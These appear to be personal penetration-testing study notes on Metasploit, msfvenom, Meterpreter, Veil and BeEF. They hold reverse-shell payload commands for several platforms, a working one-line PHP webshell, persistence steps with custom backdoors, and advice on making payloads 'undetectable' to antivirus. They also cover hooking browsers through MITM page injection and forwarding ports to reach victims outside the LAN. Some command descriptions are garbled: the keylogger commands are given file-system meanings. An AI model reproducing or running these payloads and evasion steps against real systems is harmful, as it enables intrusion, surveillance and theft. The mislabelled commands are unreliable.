---
title: Metasploit and Post-Exploitation
description: Metasploit workflows, msfvenom payloads, and post-exploitation notes.
---

Gaining Access & Information Gathering—> Client-Side && Server-Side Attacks
## Metasploit Framework: 

This is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.
The main components of the Metasploit Framework can be summarized as follows;
1. msfconsole: The main command-line interface.
2. Modules: Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. 
3. Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.  

Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
Exploit: A piece of code that will take advantage of a vulnerability present on the target system.  If we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Most of the exploits will have a preset default payload. However, you can always use the show payloads command to list other commands you can use with that specific exploit. 

Payload: These are the code that will run on the target system. Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system. 
Three different directories under payloads: singles, stagers and stages.
Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

    Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
    Stageless payloads are more common -- It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
“Stageless payloads are denoted with underscores (_).  As staged payloads are denoted with another forward slash (/)”

*Search This command will search the Metasploit Framework database for modules relevant to the given search parameter
*The exploit/run command can be used without any parameters or using the “-z” parameter. The “run/exploit -z” command will run the exploit and background the session as soon as it opens.  “Run/exploit -j” command which tells Metasploit to launch the module, running as a job in the background.
*`sessions -i <number>` to select the appropriate session to foreground.

    RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.

    RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
    PAYLOAD: The payload you will use with the exploit.
    LHOST: “Localhost/ListenHost”, the attacking machine IP address.
    LPORT: “Local port/Listen Port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
    SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.

The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.

Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit TERMINAL. You can use the background command CTRL+Z to background the session prompt and go back to the msfconsole prompt. The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.

MSFVENOM: is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc, .aspx, .war, .py).) and for many different target systems (Apple, Windows, Android, Linux, etc.)
The standard syntax for msfvenom : `msfvenom -p <PAYLOAD> <OPTIONS>`

Linux Executable and Linkable Format (elf) 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

`-f <format>` Specifies the output format. 
`-o <file>` The output location and filename for the generated payload.
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter) 
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64

Multi/Handler: It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler. The module can be used with the “use exploit/multi/handler” command. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. 
Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. 
NOPs: NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation. I.e post module to convert a shell to meterpreter shell in metasploit is “post/multi/manage/shell_to_meterpreter”

Payload Templates
Location: /modules/payloads/singles/ - https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles
Description: This directory contains single-shot payloads that do not create a staged connection. These are simpler and can be useful for understanding basic payload structures.

Staged Payloads
Location: /modules/payloads/stagers/ - https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers
Description: Stagers set up a network connection between the victim and the attacker, allowing the attacker to send a more complex second stage payload.

Stageless Payloads
Location: /modules/payloads/stageless/
Description: These payloads include all necessary components in one go, without needing a separate stager.

Payload Utilities
Location: /lib/msf/core/payload/ - https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/payload
Description: This directory often contains core libraries and utilities that support payload generation and manipulation. It's a good place to look for underlying mechanisms and exported helper methods to the Payload scripts.

Post-exploitation Modules
Location: /modules/post/
Description: While not directly related to initial payload creation, these modules can provide context on what happens after a successful exploitation, which might relate to or influence payload design.


## Metasploit_DataBase https://www.offensive-security.com/metasploit-unleashed/using-databases/

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. To initialize this database we have to “systemctl/launchctl start postgresql” which will be the web service our database runs in. Next we initialize it using “msfdb init”. You can now launch msfconsole and check the database status using the db_status command.
The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the workspace command. 

You can add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively. i.e workspace -a newProject
If you want to run a Nmap scan using the db_nmap, all results will be saved to the database. You can now fetch information relevant to active hosts and services running on target systems with the ‘hosts’ and ‘services’ commands, respectively. The hosts -h and services -h commands can help you become more familiar with available options. 
Once the host information is stored in the database, you can use the ‘hosts -R’ command to add this value to the RHOSTS parameter. 
 
## ExploitDB tends to be very useful for hackers, as it often actually contains exploits that can be downloaded and used straight out of the box. It tends to be one of the first stops when you encounter software in a CTF or pentest.
If you're inclined towards the CLI on Linux, Kali comes pre-installed with a tool called "searchsploit" which allows you to search ExploitDB from your own machine. This is offline, and works using a downloaded version of the database, meaning that you already have all of the exploits already on your Kali Linux “Searchsploit is basically just a command line search tool for exploit-db.com”
A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw. So when exploiting you can check for those on:
https://www.cvedetails.com/
https://cve.mitre.org/
However using https://virustotal.com we are able to upload our payload crosscheck it’s performance against major antivirus softwares, ensuring it returns clean. Veil Update ===> Undetectable Backdoors ===> Antivirus Update ===> Detectable Backdoors.
https://www.rapid7.com/try/nexpose/  Another Recommended Enterprise level framework by RAPID7 is NexPose which works similarly to Metasploit I.e Discover Open Ports & Running Services, Find Vulnerabilities, Find Exploits, Verify them, with extra useful features such as Generating Reports && Automate Scans.


## Post Exploitation Attacks 
MeterPreter➡️ Meterpreter shells are Metasploit's own brand of fully-featured shell. Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands. 
Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system. 
Once connected to a target computer, we can run commands just like we would any other system, however ensure to use the sysinfo to deduce information about the target operating system and permissions….Other commands include download, upload, pwd, mkdir, etc…Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.
Maintaining Access can be difficult after initial connection, various methods tried and tested are as follows; the most sustainable is Metasploit(Meterpreter) + Veil-Evasion(create custom backdoor)
Using Veil-Evasion modules 
Rev_http_service
Rev_tcp_service
Upload and execute from Meterpreter
Using Persistence Module
>run persistence -h //This might be detectable by antivirus programs
Using Metasploit + Veil-Evasion // More robust + Undetectable by Antivirus
>use exploit/windows/local/persistence
>set session [session id]
>set exe::custom [backdoor location]
>exploit
Key Logging➡️ Log all mouse/keyboard events of target computer
Keyscan_start ===>Shows current working directory
keyscan_dump ===>Lists files in the current working directory
keyscan_stop ===>Changes working directory to [location specified]
Screenshot ====> Take a screenshot of the target computer
Pivoting➡️ Using the hacked target device as a pivot to try to gain access to other devices In the same local network.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
As PHP is still the most common server side scripting language, let's have a look at some simple code for this. In a very basic one line format:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

https://www.youtube.com/watch?v=vSYUhaTUp1E
https://tryhackme.com/room/introtoshells


## *BEEF Browser Exploitation Framework* Allows us to launch a number of attacks on a hooked target, Target are hooked once they load a hook URL. 
Start by searching your application on Kali *Beef Start* Once it’s started we can login to the browser UI and monitor hooked systems. Using the Hook.js file we can edit our apache server HTML page with our system IP address, start our Apache server so it listens for connection, Once a browser visits our IP address, it automatically hooked. We can enhance our index.html page to have more than just a blank page, do remember however to embed the hook.js into the script tag. 
DNS spoof requests to a page containing the hook
- Social Engineer the target to open a hook page 
- Use XSS exploit

## *BEEF Browser Exploitation Framework && Bettercap*
Inject the hook in browsed pages (need to be MITM via bettercap), this is easily done by editing including a custom malicious Javascript file with BEEF configurations(I.e inject_beef.js from ZSecurity) into the bettercap hstshijack.payloads @ usr/share/bettercap/caplets/hstshijack text document, ensure to also make \{file_path\} accessible to bettercap. 

## BEEF/Metasploit/Veil-Evasion Attacks on Clients outside your LAN* This can be achieved through Port forwarding through your access point router.
Note: public IP(WAN) == Access Point/Router public IP && private IP(LAN via DHCP is shared by the Access point/Router to Connected Clients i.e Gateway Address/24). Request made to the Internet by connected clients is routed via the access point and hence the visible IP address on the internet is the Access point Routing Address. 
To send a backdoor/exploits I.e reverse_http over the internet to Target, SET up our Metasploit && Beef and configuring their parameters I.e LHOST, LPORT, Index.html\{embedded hook.js\},  to use our public IP & designated port# where necessary and also start our apache server to serve malicious webpages to our target. Next we configure port forwarding rules on our A.P/Router to listen for connections using our private IP(LAN), this will ensure that any incoming connection received on your router via a designated port is forwarded back to you. This includes rules for Apache server, Beef, Metasploit payloads connections.
The Trick here is use External IP/Public IP address for outbound connections(WAN) && whilst listening for inbound connections use router configured port forwarding rules, & Private IP address
